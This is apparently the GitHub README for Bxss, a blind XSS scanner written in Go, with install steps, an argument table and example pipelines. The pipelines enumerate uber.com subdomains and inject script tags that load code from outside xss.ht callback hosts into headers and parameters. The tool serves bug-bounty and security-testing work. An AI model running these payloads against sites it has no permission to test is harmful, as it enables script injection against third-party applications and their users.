<h1 align="center">
  <br>
<img src="https://github.com/ethicalhackingplayground/bxss/blob/master/static/blinded-drib.jpg" width="200px" alt="Bxss">
</h1>
<h1 align="center">
Bxss - Blind XSS Scanner

[![Version](https://img.shields.io/github/v/release/ethicalhackingplayground/bxss?style=flat-square)](https://github.com/ethicalhackingplayground/bxss/releases/latest)
[![License](https://img.shields.io/github/license/ethicalhackingplayground/bxss?style=flat-square)](https://github.com/ethicalhackingplayground/bxss/blob/main/LICENSE)
[![Go Report Card](https://goreportcard.com/badge/github.com/ethicalhackingplayground/bxss?style=flat-square)](https://goreportcard.com/report/github.com/ethicalhackingplayground/bxss)
[![Go Reference](https://pkg.go.dev/badge/github.com/ethicalhackingplayground/bxss.svg)](https://pkg.go.dev/github.com/ethicalhackingplayground/bxss)

## </h1>

## Description

Blind XSS Scanner is a tool that can be used to scan for blind XSS vulnerabilities in web applications.

---

### Features

- Inject Blind XSS payloads into custom headers
- Inject Blind XSS payloads into parameters
- Uses Different Request Methods (PUT,POST,GET,OPTIONS) all at once
- Tool Chaining
- Really fast
- Easy to setup

## Install

```
go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest
```

---

## Arguments

| Argument              | Description                              | Default      |
| --------------------- | ---------------------------------------- | ------------ |
| `-appendMode`         | Append the payload to the parameter      |              |
| `-concurrency int`    | Set the concurrency                      | 30           |
| `-header string`      | Set the custom header                    | "User-Agent" |
| `-headerFile string`  | Path to file containing headers to test  |              |
| `-parameters`         | Test the parameters for blind xss        |              |
| `-payload string`     | The blind XSS payload                    |              |
| `-payloadFile string` | Path to file containing payloads to test |              |

---

## Demonstration

[![asciicast](https://asciinema.org/a/mPB0Vms70kvD8dd99BwYi1ucm.svg)](https://asciinema.org/a/mPB0Vms70kvD8dd99BwYi1ucm)

---

### Blind XSS In Parameters

```bash
subfinder uber.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
```

### Blind XSS In X-Forwarded-For Header

```bash
subfinder uber.com | gau | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"
```

---

**If you get a bounty please support by buying me a coffee**

<br>
<a href="https://buymeacoffee.com/zoidsec" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
